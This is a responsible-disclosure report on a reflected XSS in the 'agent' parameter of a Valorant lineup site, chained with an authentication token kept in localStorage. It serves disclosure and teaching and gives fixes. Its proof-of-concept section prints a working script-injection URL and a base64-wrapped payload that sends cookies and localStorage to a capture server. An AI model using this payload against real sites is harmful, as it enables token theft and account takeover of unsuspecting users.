# lineupsvalorant-xss-localStorage-token-exposure
Reflected XSS via query parameter chained with authentication token exposure in localStorage
[readme.md](https://github.com/user-attachments/files/27033004/readme.md)
# Responsible Disclosure — Reflected XSS with Sensitive Token Exposure via localStorage

**Target:** [target]  
**Discovery date:** April 2026  
**Report date:** April 2026  
**Platform:** OpenBugBounty  
**Status:** Reported ✅  
**CVE:** N/A (not requested)  
**Findings:** 2 (consolidated into 1 attack chain)

---

## Summary

A Reflected Cross-Site Scripting (XSS) vulnerability was identified in the `agent` query parameter of the [target] web application. The vulnerability allows injection and execution of arbitrary JavaScript in the context of the victim's browser.

During exploitation research, it was also identified that the application stores a `user_token` in `localStorage` without any protection mechanism, making it directly accessible via the XSS vector. The combination of both issues creates a complete attack chain capable of silently exfiltrating authentication tokens from any user who visits a crafted URL.

This report follows responsible disclosure practices. All tests were performed using a personal test account created specifically for this research. No real user data was accessed, collected, or stored.

---

## Findings Overview

| # | Title | CWE | CVSS v3.1 | Severity |
|---|---|---|---|---|
| 1 | Reflected XSS via `agent` parameter | CWE-79 | **6.1** | Medium |
| 2 | Authentication token exposed in localStorage | CWE-922 | **6.5** | Medium |
| — | **Combined attack chain** | CWE-79 + CWE-922 | **8.8** | **High** |

---

## Finding 1 — Reflected XSS via `agent` Parameter

**CWE:** CWE-79 — Improper Neutralization of Input During Web Page Generation  
**CVSS v3.1 Base Score:** 6.1 (Medium) — isolated  
**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`

### CVSS Calculation

| Metric | Value | Weight |
|---|---|---|
| Attack Vector | Network | 0.85 |
| Attack Complexity | Low | 0.77 |
| Privileges Required | None | 0.85 |
| User Interaction | Required | 0.62 |
| Scope | **Changed** | — |
| Confidentiality | Low | 0.22 |
| Integrity | Low | 0.22 |
| Availability | None | 0.00 |

```
ISCBase        = 1 − (1 − 0.22)(1 − 0.22)(1 − 0) = 0.3916
ISC (S:C)      = 7.52 × 0.3916 − 0.029            = 2.919
Exploitability = 8.22 × 0.85 × 0.77 × 0.85 × 0.62 = 2.838
Base Score     = Roundup(min((2.919 + 2.838) × 1.08, 10)) = 6.1
```

### Description

The `agent` parameter on the homepage is reflected directly into the HTML response without sanitization, allowing injection of arbitrary HTML and JavaScript. The application does not implement any Content Security Policy (CSP) that would prevent script execution.

### Vulnerable Endpoint

```
https://[target]/?agent=<PAYLOAD>
```

### Proof of Concept

**Step 1 — Basic XSS confirmation:**
```
https://[target]/?agent="><script>alert(1)</script>
```
Result: Alert dialog executes in the victim's browser.

**Step 2 — Exfiltration payload (base64 encoded to bypass URL encoding issues):**

Decoded payload:
```javascript
fetch('https://[REDACTED-CAPTURE-SERVER]/?c=' + encodeURIComponent(document.cookie),
  {method:'POST',headers:{'Content-Type':'application/json'},
  body:JSON.stringify({content: 'cookies: ' + document.cookie + ' | ls: ' + JSON.stringify(localStorage)})
})
```

Final URL:
```
https://[target]/?agent="><script>eval(atob('[BASE64_ENCODED_PAYLOAD]'))</script>
```

### Impact

- Execution of arbitrary JavaScript in the victim's browser context
- Access to `document.cookie` (cookies without `HttpOnly` flag)
- Full access to `localStorage` and `sessionStorage`
- Ability to perform authenticated requests on behalf of the victim
- Enables phishing, session hijacking, and data exfiltration

---

## Finding 2 — Authentication Token Exposed in localStorage

**CWE:** CWE-922 — Insecure Storage of Sensitive Information  
**CVSS v3.1 Base Score:** 6.5 (Medium) — isolated  
**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N`

### Description

The application stores a `user_token` authentication token directly in `localStorage`. This storage mechanism is accessible to any JavaScript running in the page context, including injected scripts via XSS. Unlike `HttpOnly` cookies, `localStorage` values cannot be protected from JavaScript access at the browser level.

### Data Exposed via XSS

The following sensitive data was confirmed to be accessible in the browser context of an authenticated user:

| Location | Field | Type | Risk |
|---|---|---|---|
| `document.cookie` | `username` | PII | Identity disclosure |
| `document.cookie` | `language`, `first_visit` | Session data | Low |
| `localStorage` | `user_token` | **Authentication token** | **Account takeover** |
| `localStorage` | `viewer_data` | User preferences | Low |
| `localStorage` | `_grecaptcha` | reCAPTCHA token | Low |

### Sample Exfiltrated Data (test account only)

```json
{
  "cookies": "language=en; first_visit=false; username=[REDACTED]",
  "localStorage": {
    "numVisits": "74",
    "viewer_data": {"collapse_overview": true, "pin_overview": false},
    "username": "[REDACTED]",
    "shownOverlayPopup": "true",
    "user_token": "[REDACTED]"
  }
}
```

> All values above belong to a test account created exclusively for this research. Real user data was never accessed.

---

## Combined Attack Chain — CVSS 8.8 High

**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N`

```
ISCBase        = 1 − (1 − 0.56)(1 − 0.22)(1 − 0) = 0.6568
ISC (S:C)      = 7.52 × 0.6568 − 0.029            = 4.91
Exploitability = 8.22 × 0.85 × 0.77 × 0.85 × 0.62 = 2.838
Base Score     = Roundup(min((4.91 + 2.838) × 1.08, 10)) = 8.8
```

When chained together, the attack elevates to High severity:

```
Attacker crafts malicious URL
        ↓
Victim clicks the link (social engineering / phishing)
        ↓
XSS payload executes in victim's browser context
        ↓
localStorage is read → user_token extracted
        ↓
Token silently exfiltrated to attacker-controlled server
        ↓
Attacker authenticates as victim → Account Takeover
```

### Realistic Attack Scenario

1. Attacker crafts a URL containing the XSS payload and encodes it in base64 to avoid obvious detection
2. URL is shared via Discord, Reddit, Twitter, or any Valorant community channel — disguised as a "lineup guide" link
3. Victim (a Valorant player) clicks the link, trusting the domain `[target]`
4. XSS executes silently — no visible indication to the victim
5. `user_token` and cookies are sent to the attacker's server
6. Attacker uses the token to authenticate as the victim

---

## Recommendations

### Immediate — XSS Fix
Sanitize and encode all user-supplied input before reflecting it in HTML responses. Use a library such as DOMPurify on the client side or an appropriate server-side encoder:

```javascript
// Never do this:
document.innerHTML = userInput;

// Do this instead:
import DOMPurify from 'dompurify';
document.innerHTML = DOMPurify.sanitize(userInput);
```

### Short term — Token Storage
Move authentication tokens from `localStorage` to `HttpOnly` cookies. `HttpOnly` cookies are not accessible via JavaScript, making them immune to XSS-based exfiltration:

```
Set-Cookie: user_token=VALUE; HttpOnly; Secure; SameSite=Strict
```

### Complementary — Content Security Policy
Implement a Content Security Policy header to restrict which origins scripts can communicate with:

```
Content-Security-Policy: default-src 'self'; script-src 'self'; connect-src 'self'
```

This would prevent exfiltration to external servers even if XSS is present.

---

## Disclosure Timeline

| Date | Event |
|---|---|
| April 2026 | Vulnerability identified |
| April 2026 | Exploitation chain confirmed using personal test account |
| April 2026 | Report submitted via OpenBugBounty |
| April 2026 | Public disclosure after report submission |

---

## Notes

- All testing was performed using a personal test account created exclusively for this research
- No real user data was accessed, stored, or shared at any point
- The `user_token` shown in this report belongs exclusively to the test account and has been redacted
- No destructive actions were performed — all requests were read-only GET/fetch operations
- This report is intended as a learning resource and portfolio piece

---

*Written by Leonardo — security researcher.*  
*If you found this report useful as a template, feel free to adapt it for your own responsible disclosures.*
